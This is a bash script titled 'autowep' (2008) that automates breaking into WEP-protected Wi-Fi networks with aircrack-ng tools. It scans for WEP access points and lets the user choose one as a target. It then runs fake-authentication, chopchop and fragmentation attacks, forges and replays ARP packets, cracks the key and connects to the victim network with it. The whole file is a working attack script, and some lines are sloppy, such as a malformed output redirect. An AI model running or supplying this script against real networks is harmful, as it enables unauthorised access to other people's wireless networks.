
# Program: autowep
# Author: Karson M
# Date: 04.22.2008
# Version: 1.1
# Dependencies: aircrack-ng,X Window System, madwifi



MYMAC="00:19:7E:92:C5:DB" #MAC ADDRESS of our wifi card
LOC="/pentest/wireless/autowep" #location of autowep
DEBUG="0" #1= on
KNOWN="0" #1=on enter AP info if known
Host_MAC="00:00:00:00:00:00" # MAC address of the AP
Host_CHAN="1" #AP channel
Host_ESSID="essid" #AP essid
KEY=""

#########################################

function debug 
{
 clear
 if [ $DEBUG = 1 ]
 then
 HOLD="-hold"
 else
 HOLD="" 
fi
 
}

#########################################
# Main Section 
clear
 ifconfig ath0 down
 xterm $HOLD -title "Driver Control" -geometry 84x25+0+0 -bg "#000000" -fg "#D7C5FF" -e airmon-ng stop ath1
 xterm $HOLD -title "Driver Control" -geometry 84x25+0+0 -bg "#000000" -fg "#D7C5FF" -e airmon-ng start wifi0
 rm -rf $LOC/dump* &
if [ $KNOWN = 0 ]
 then
 xterm $HOLD -title "Scanning for targets" -geometry 100x50+0+0 -bg "#000000" -fg "#D7C5FF" -e airodump-ng --ivs -w $LOC/dump ath1
 HOST=`cat $LOC/dump-01.txt | grep WEP | awk '{ print $1 $6 $18 $20}'| grep -v 00:00:00:00:00:00| grep -v 00:00:00:00:00| grep -v 00:00:00:00| grep -v 00:00`
 clear
 echo "Select target"
 echo ""
 select TARGET in $HOST;
 do
 export Host_MAC=` echo $TARGET | awk '{
 split($1, info, "," )
 print info[1] }' `
 export Host_CHAN=` echo $TARGET | awk '{
 split($1, info, "," )
 print info[2] }' `
 export Host_SSID=` echo $TARGET | awk '{
 split($1, info, "," )
 print info[3] }' `
 export Host_ESSID=` echo $TARGET | awk '{
 split($1, info, "," )
 print info[4] }' `
 break; 
done
fi
echo $Host_MAC
echo $Host_CHAN
echo $Host_ESSID
echo $MYMAC

before="$(date +%s)"
iwconfig ath1 channel $Host_CHAN
xterm $HOLD -title "Captureing Target" -geometry 100x50+0+0 -bg "#000000" -fg "#D7C5FF" -e airodump-ng --ivs -c $Host_CHAN --bssid $Host_MAC -w $LOC/$Host_ESSID ath1 & 

xterm -hold -title "Fake auth" -geometry 100x50+0+0 -bg "#000000" -fg "#D7C5FF" -e aireplay-ng -1 4500 -o 1 -q 10 -e $Host_ESSID -a $Host_MAC -h $MYMAC ath1 & 

xterm -hold -title "Chopchop" -geometry 82x25-0+0 -bg "#000000" -fg "#D7C5FF" -e aireplay-ng -4 -b $Host_MAC -h $MYMAC ath1 &
xterm -title "Fragment Attack" -geometry 82x25-0-0 -bg "#000000" -fg "#D7C5FF" -e aireplay-ng -5 -b $Host_MAC -h $MYMAC ath1 

xterm -geometry 84x25+0-0 -title "Making arp request using frag" -e packetforge-ng -0 -a $Host_MAC -h $MYMAC -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w arp-request&
xterm -geometry 84x25+0-0 -title "Making arp request using chopchop" -e packetforge-ng -0 -a $Host_MAC -h $MYMAC -k 255.255.255.255 -l 255.255.255.255 -y replay*.xor -w arp-request

xterm $HOLD -geometry 84x25+0-0 -title "Using arp request" -e aireplay-ng -2 -r arp-request ath1 

aircrack-ng -a 1 -b $Host_MAC -0 $LOC/$Host_ESSID*.ivs
aircrack-ng -a 1 -b $Host_MAC -0 $LOC/$Host_ESSID*.ivs &» $LOC/$Host_ESSID.key 

KEY=`cat /$LOC/$Host_ESSID.key | grep FOUND | awk '{ print $4 }'`
after="$(date +%s)"
aircrack-ng -a 1 -b $Host_MAC -0 $LOC/$Host_ESSID*.ivs
###########################Connect to host#################################33
	echo "Using this key $KEY to connect to: $Host_ESSID"
	echo ""
	echo "Setting: iwconfig $WIFI mode Managed"
	sleep 3
	ifconfig ath0 up
	sleep 2
	iwconfig ath0 mode managed ap any rate auto channel $Host_CHAN essid $Host_ESSID key restricted $KEY 
	sleep 1
	echo "Setting: iwconfig ath1 essid $Host_ESSID"
	iwconfig ath0 essid $Host_ESSID
	echo "Setting: iwconfig ath1 key $KEY"
	iwconfig ath0 key restricted $KEY
	echo "Setting: dhcpcd ath1"
	sleep 1
	iwconfig ath0 rate auto
	iwconfig ath0 ap any
	sleep 3
	iwconfig ath0 ap any rate auto mode Managed channel $Host_CHAN essid $Host_ESSID key restricted $KEY
	sleep 3
	dhcpcd ath0
	echo "Will now ping google.com"
	ping www.google.com -c 2
elapsed_seconds="$(expr $after - $before)"
echo Elapsed time for crack: $elapsed_seconds seconds
echo AP Key = $KEY
echo MAC of AP = $Host_MAC
echo Ap Channel = $Host_CHAN
echo Ap ESSID = $Host_ESSID
#end